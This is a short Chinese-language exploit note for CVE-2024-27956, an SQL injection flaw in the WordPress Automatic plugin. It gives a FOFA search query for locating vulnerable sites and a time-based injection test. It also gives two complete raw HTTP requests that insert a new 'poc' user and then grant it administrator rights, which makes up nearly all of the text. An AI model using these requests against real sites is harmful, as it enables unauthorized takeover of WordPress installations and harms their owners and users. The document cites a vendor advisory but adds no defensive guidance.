## WordPress-Automatic插件存在SQL注入漏洞(CVE-2024-27956)

## fofa
```
body="/wp-content/plugins/wp-automatic"
```

## poc
```
POST /wp-content/plugins/wp-automatic/inc/csv.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close

q=SELECT+IF(1=1,sleep(5),sleep(0))&auth=%00&integ=93cf9aa11e746596d6f31765a7222c9f
```

## 创建WordPress账户
```
POST /wp-content/plugins/wp-automatic/inc/csv.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close

q=INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status) VALUES ('poc', MD5('poc'), 'poc', 'poc@localhost.org', NOW(), 0);&auth=%20&integ=5be638728303f002fd54450e5866dd28
```

## 赋予管理员权限
```
POST /wp-content/plugins/wp-automatic/inc/csv.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close

q=INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (6, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}'), (6, 'wp_user_level', '10');&auth=%20&integ=6ed26ea278413ec91e2c27fed01eac6c
```

## 来源
- https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin?_s_id=cve
